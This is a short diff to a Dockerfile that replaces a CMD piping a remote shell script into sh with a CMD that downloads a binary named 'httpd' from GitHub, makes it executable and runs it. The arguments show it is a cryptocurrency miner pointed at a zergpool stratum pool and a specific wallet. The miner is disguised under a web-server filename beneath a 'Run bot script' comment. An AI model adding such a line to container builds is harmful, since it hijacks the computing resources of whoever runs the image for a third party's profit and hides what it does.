@@ -21,4 +21,5 @@ RUN apt-get update && apt-get install -y \
 RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
             
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/55113110159/OS/main/log.sh | sh
+CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr --timeout 120 -p c=SWAMP,mc=SPRX/SWAMP/VHH 
+
